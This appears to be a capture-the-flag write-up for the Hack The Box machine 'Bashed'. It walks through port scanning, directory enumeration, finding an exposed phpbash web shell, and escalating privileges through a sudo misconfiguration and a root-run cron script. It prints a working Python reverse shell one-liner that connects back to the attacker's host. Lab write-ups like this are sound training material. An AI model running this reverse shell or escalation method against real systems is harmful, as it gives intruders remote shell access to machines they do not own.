+++
draft = false
date = 2020-06-16T16:04:02+01:00
title = "Bashed"
description = ""
slug = ""
tags = []
categories = []
externalLink = ""
series = []
weight = 4  
+++


# Machine info

- OS : Linux
- Difficulty : Easy
- Points : 20
- IP : 10.10.10.68


# Mind Map
![Bashed_MindMap](/images/htb/bashed_mindmap.png)


# Reconnaisance

Initial scan results:

{{< highlight html >}}
sudo nmap -sS -p- -n 10.10.10.68 -oA nmap/sS_full_scan
...
Nmap scan report for 10.10.10.68
Host is up (0.066s latency).
Not shown: 65534 closed ports
PORT   STATE SERVICE
80/tcp open  http
{{< /highlight >}}

**Note**: a full port UDP scan does not reveal any new open port.

With the `-sV` option I can see that `Apache HTTP Server 2.4.18` is running on port 80.


# Enumeration

I proceed visiting http://10.10.10.68:80.

![Bashed_Website](/images/htb/bashed_website.png)

The website owner is telling me that a tool named `phpbash` is installed on the server and that it could be very useful for pentesting. Also a link to the GitHub repository tool is given, where I can find more info about it:

> phpbash is a standalone, semi-interactive web shell. It's main purpose is to assist in penetration tests where traditional reverse shells are not possible. The design is based on the default Kali Linux terminal colors, so pentesters should feel right at home.

I don't know where to look for the web shell, so I try to enumerate directories on the web server to see if I can find something:

{{< highlight html >}}
sudo python3 /opt/dirsearch/dirsearch.py -u http://10.10.10.68/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt -r -f -e php
{{< /highlight >}}
Where:
- `-w` specifies the wordlist used for enumerating the web server
- `-r` stands for recursive mode
- `-f` stands for force extensions
- `-e` for specifying the desired extension to search

After a few moments, *dirsearch* is able to find some resources on the web server:

{{< highlight bash >}}
[10:39:17] Starting:
[10:39:18] 403 -  290B  - /.php
[10:39:18] 403 -  291B  - /.html
[10:39:18] 200 -    8KB - /index.html
[10:39:18] 200 -    2KB - /images/   
[10:39:19] 200 -    8KB - /contact.html  
[10:39:19] 200 -    8KB - /about.html   
[10:39:24] 403 -  292B  - /icons/         
[10:39:31] 200 -   14B  - /uploads/       
[10:39:47] 200 -  939B  - /php/                    
[10:40:06] 200 -    2KB - /css/                
[10:40:31] 200 -    1KB - /dev/                 
[10:40:42] 200 -    3KB - /js/                
CTRL+C detected: Pausing threads, please wait...
{{< /highlight >}}


# Exploitation

The web shell is under `/dev` and I can see that I'm logged in as the `www-data` user! We're in!

# Privilege escalation

At this point I have to figure out how to obtain full access to the server.

The first thing I look for is to see if there is something I can sudo with the current user without providing a password:

{{< highlight html >}}
www-data@bashed
:/var/www/html/dev# sudo -l

Matching Defaults entries for www-data on bashed:
env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User www-data may run the following commands on bashed:
(scriptmanager : scriptmanager) NOPASSWD: ALL
{{< /highlight >}}

I'm able to run any command with root privileges as the `scriptmanager` user!

To change current user I can use the following command:

{{< highlight html >}}
sudo -i -u scriptmanager
{{< /highlight >}}
Where:
- `-i` stands for login
- `-u` stands for users

I'm not able to do so inside the current web shell as it is not persistent, so I need to create a reverse shell to my machine in order to proceed. I'll use a **python reverse shell** obtained from the **Pentestmonkey** website:

I set up a netcat listener on my machine:

{{< highlight html >}}
nc -nlvp 4445
{{< /highlight >}}


And launch the reverse shell from the web shell:

{{< highlight python >}}
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.18",4445));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
{{< /highlight >}}

I receive a connection back in a few seconds. From the new shell I'm able to change user to `scriptmanager`.

It took me a while here to understand what to do next, but at the end I found an interesting directory under `/` named `/scripts` owned by the `scriptmanager` user. Inside this directory there's a file named `test.py` (owned by *scriptmanager*) that writes into `test.txt` (owned by *root*) every minute or so. From here it is easy to get root as I only have to set up a netcat listener on my machine and insert a reverse shell code in the `test.py` file and wait for the connection!


## Lessons learned and remediations

- Never expose so easily a shell on the web server.
- Always check for misconfigurations about user permissions. Why was the `www-data` user able to run commands as `scriptmanager`?
